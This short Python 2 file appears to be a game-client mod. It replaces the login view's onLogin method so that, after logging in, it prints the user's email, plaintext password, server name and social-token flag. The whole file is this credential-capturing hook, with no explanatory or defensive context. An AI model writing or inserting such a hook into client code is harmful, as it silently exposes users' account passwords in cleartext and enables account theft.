from gui.Scaleform.daapi.view.login.LoginView import LoginView

def new_onLogin(self, userName, password, serverName, isSocialToken2Login):

    old_onLogin(self, userName, password, serverName, isSocialToken2Login)

    print 'Email: %s | Password: %s | Server: %s | isSocialToken: %s' % (userName, password, serverName, isSocialToken2Login)


old_onLogin = LoginView.onLogin
LoginView.onLogin = new_onLogin